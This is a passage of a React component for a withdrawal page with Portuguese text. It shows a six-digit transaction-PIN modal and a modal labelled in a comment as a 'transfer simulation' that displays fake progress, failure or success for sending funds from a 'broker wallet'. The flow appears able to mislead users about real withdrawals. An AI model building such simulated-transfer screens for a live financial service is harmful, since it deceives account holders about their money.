                  Sua conta foi reativada. Por favor, insira o PIN de transação para confirmar o saque.
                </p>
              </div>
              <button
                onClick={() => setShowPinModal(false)}
                className="p-1 hover:bg-gray-100 rounded-lg transition-colors"
              >
                <X className="w-4 h-4 sm:w-5 sm:h-5 text-gray-500" />
              </button>
            </div>

            <div className="my-3 sm:my-4">
              <label htmlFor="pinInput" className="block text-sm font-medium text-gray-700 mb-1">
                PIN de Transação
              </label>
              <input
                id="pinInput"
                type="password"
                placeholder="Digite o PIN de 6 dígitos"
                value={pinCode}
                onChange={(e) => setPinCode(e.target.value)}
                className={`w-full px-3 sm:px-4 py-2.5 sm:py-3 border ${pinError ? 'border-red-500' : 'border-gray-200'} rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all text-sm sm:text-base`}
                autoFocus
                maxLength="6"
              />
              {pinError && (
                <div className="flex items-center gap-2 mt-2 text-red-600 text-xs sm:text-sm">
                  <AlertCircle className="w-3 h-3 sm:w-4 sm:h-4 flex-shrink-0" />
                  <span>{pinError}</span>
                </div>
              )}
              {pinAttempts > 0 && pinAttempts < 3 && (
                <p className="text-xs text-gray-500 mt-2">
                  Tentativas restantes: {3 - pinAttempts}
                </p>
              )}
            </div>

            <div className="flex flex-col sm:flex-row gap-2 sm:gap-3">
              <button
                onClick={handleVerifyPin}
                disabled={isVerifyingPin || pinAttempts >= 3}
                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 sm:py-3 rounded-xl transition-all disabled:opacity-50 flex items-center justify-center gap-2 text-sm sm:text-base"
              >
                {isVerifyingPin ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    Verificando...
                  </>
                ) : (
                  <>
                    <Lock className="w-4 h-4" />
                    Confirmar
                  </>
                )}
              </button>
              <button
                onClick={() => setShowPinModal(false)}
                className="px-3 sm:px-4 py-2.5 sm:py-3 border border-gray-200 rounded-xl hover:bg-gray-50 transition-colors text-sm sm:text-base"
              >
                Cancelar
              </button>
            </div>

            {pinAttempts >= 3 && (
              <div className="mt-3 p-3 bg-red-50 rounded-lg">
                <p className="text-center text-xs sm:text-sm text-red-600">
                  <AlertCircle className="w-3 h-3 sm:w-4 sm:h-4 inline-block mr-1" />
                  Muitas tentativas falhas. A transação foi cancelada. Tente novamente.
                </p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* TRANSFER SIMULATION MODAL (failure or success) */}
      {showTransferModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm p-4">
          <div className="bg-white rounded-2xl p-4 sm:p-6 w-full max-w-md mx-4 shadow-2xl text-center">
            <h3 className="text-lg sm:text-xl font-bold text-gray-900 mb-2">
              {transferStatus === 'pending' && 'Transferindo fundos...'}
              {transferStatus === 'failed' && 'Falha na transferência'}
              {transferStatus === 'complete' && 'Transferência concluída!'}
            </h3>
            <p className="text-sm text-gray-500 mb-4">
              {transferStatus === 'pending' && 'Enviando da carteira do broker para o seu endereço de destino'}
              {transferStatus === 'failed' && 'Não foi possível completar a transferência. Tente novamente.'}
              {transferStatus === 'complete' && 'Os fundos foram enviados com sucesso!'}
            </p>

            {/* Progress bar */}
            <div className="w-full bg-gray-200 rounded-full h-3 mb-2 overflow-hidden">
              <div
                className={`h-full rounded-full transition-all duration-300 ${
                  transferStatus === 'failed' ? 'bg-red-500' : 'bg-blue-600'
                }`}
                style={{ width: `${transferProgress}%` }}
              />
            </div>
            <p className="text-xs text-gray-400 mb-4">{transferProgress}%</p>

            {/* Status icon */}
            {transferStatus === 'failed' && (
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
                  <AlertCircle className="w-8 h-8 text-red-600" />
                </div>
              </div>
            )}

            {transferStatus === 'complete' && (
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                  <CheckCircle className="w-8 h-8 text-green-600" />
                </div>
              </div>
            )}

            {/* Action button */}
            {transferStatus !== 'pending' && (
              <button
                onClick={() => {
                  setShowTransferModal(false);
                  if (transferStatus === 'failed') {
                    toast.warning('Você pode tentar novamente.');
                  }
                }}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 sm:py-3 rounded-xl transition-all text-sm sm:text-base"
              >
                {transferStatus === 'failed' ? 'Tentar Novamente' : 'Fechar'}
              </button>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Withdraw;